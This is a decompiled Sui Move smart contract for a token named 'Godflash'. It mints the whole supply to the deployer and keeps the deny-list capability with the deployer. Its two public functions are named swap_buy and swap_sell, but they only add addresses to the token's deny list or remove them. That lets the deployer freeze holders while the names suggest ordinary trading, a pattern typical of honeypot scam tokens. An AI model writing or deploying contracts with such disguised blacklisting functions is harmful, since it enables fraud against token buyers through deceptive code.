module 0x24b6e0a0c96b4eb6c1040f9b5aba266d2844529eb59ee0469e0694594d41a17e::godflash {
    struct GODFLASH has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: GODFLASH, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<GODFLASH>(arg0, 9, b"Godflash", b"Godflash", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmZB3jBS3kDGKi8GpPFnD9kciNZ7cbyf3RSwudzrcpJLAA"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<GODFLASH>(&mut v3, 420000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<GODFLASH>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<GODFLASH>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<GODFLASH>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<GODFLASH>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<GODFLASH>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<GODFLASH>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<GODFLASH>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

